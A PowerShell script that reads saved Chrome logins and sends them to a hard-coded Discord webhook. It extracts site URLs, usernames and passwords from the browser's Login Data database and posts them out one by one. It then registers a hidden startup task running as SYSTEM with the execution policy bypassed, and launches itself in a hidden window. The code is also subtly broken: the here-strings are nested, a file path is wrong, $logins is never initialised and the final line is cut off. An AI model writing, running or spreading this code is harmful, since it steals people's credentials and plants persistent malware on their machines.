# Define the PowerShell script as a string
$script = @"
# Define the webhook URL
$webhookUrl = "https://discordapp.com/api/webhooks/1271517665332035584/e7Vf3prmpK42ZsCn8uT3AcbeBwzoSH500vJNTbnULsrRr1ktFj_0E518oW2k0CKgZvfc"

# Define the path to the Chrome login data file
$chromeDataFile = "$env:APPDATA\Local\Google\Chrome\User Data\Default\Login Data"

# Define the SQL query to extract the login data
$chromeQuery = @"
SELECT action_url, username_value, password_value
FROM logins
WHERE origin_url = ''
"@

# Define a function to extract the login data from the Chrome database
function Get-ChromeLogins {
  $connectionString = "Data Source=$chromeDataFile;Version=3;"
  $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
  $connection.Open()
  $command = New-Object System.Data.SQLite.SQLiteCommand($chromeQuery, $connection)
  $reader = $command.ExecuteReader()
  while ($reader.Read()) {
    $login = New-Object PSObject
    $login | Add-Member -MemberType NoteProperty -Name "URL" -Value $reader.GetString(0)
    $login | Add-Member -MemberType NoteProperty -Name "Username" -Value $reader.GetString(1)
    $login | Add-Member -MemberType NoteProperty -Name "Password" -Value $reader.GetString(2)
    $logins += $login
  }
  $connection.Close()
  return $logins
}

# Define a function to send the login data to the webhook
function Send-LoginsToWebhook {
  param([Parameter(Mandatory=$true)] $logins)
  foreach ($login in $logins) {
    $body = @{
      "url" = $login.URL
      "username" = $login.Username
      "password" = $login.Password
    }
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($body | ConvertTo-Json)
  }
}

# Extract the login data from the Chrome database
$chromeLogins = Get-ChromeLogins

# Send the login data to the webhook
Send-LoginsToWebhook -Logins $chromeLogins

# Define the startup task
$taskName = "ChromeLoginExtractor"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"C:\path\to\script.ps1`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
$task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings

# Register the startup task
Register-ScheduledTask -TaskName $taskName -InputObject $task
"@

# Define the command to run the PowerShell script
$command = "powershell.exe -nologo -noprofile -command `"$script`" -WindowStyle Hidden"

# Run the command
Start-Process -FilePath cmd.exe -ArgumentList "/c $command" -WindowStyle Hi
